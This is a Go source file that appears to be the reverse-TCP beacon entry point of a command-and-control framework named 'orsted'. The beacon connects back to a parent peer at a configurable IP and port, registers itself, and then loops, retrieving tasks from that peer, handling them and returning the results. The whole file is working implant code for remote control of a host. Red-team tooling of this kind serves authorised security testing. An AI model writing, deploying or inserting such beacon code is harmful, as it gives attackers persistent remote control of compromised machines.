//go:build tcp
// +build tcp

package main

import (
	"time"

	"orsted/beacon/core"
	"orsted/beacon/peers"
	"orsted/beacon/utils"
	"orsted/profiles"
)

var (
	Targetip   string
	Targetport string
)

func beaconReverseTcp() {
	_ = profiles.InitialiseProfile()

	// TODO: Find a way to pass IP and Port as argument
	trp, _ := peers.NewTCPReversePeer(profiles.Config, Targetip, Targetport)
	utils.ParentPeer = trp
    utils.Print("Starting Reverse TCP")

	// Registering Beaocn by talking with parent peer
	beaconId, err := core.RegisterBeacon(trp)
	if err != nil {
        utils.Print("Error while registering", err.Error())
	}

    utils.Print("Connection ID", beaconId)
	utils.CurrentBeaconId = beaconId
	for {
		time.Sleep(time.Millisecond * time.Duration(profiles.Config.Interval))

		// Ask Parent peer to give tasks
		tasks, err := core.RetreiveTask(trp, beaconId)
		if err != nil {
            utils.Print("Error while retreiving task from parent peer", err.Error())
		}
		core.HandleTasks(*tasks, core.SendTaskResult)

	}
}

func main() {
	beaconReverseTcp()
}
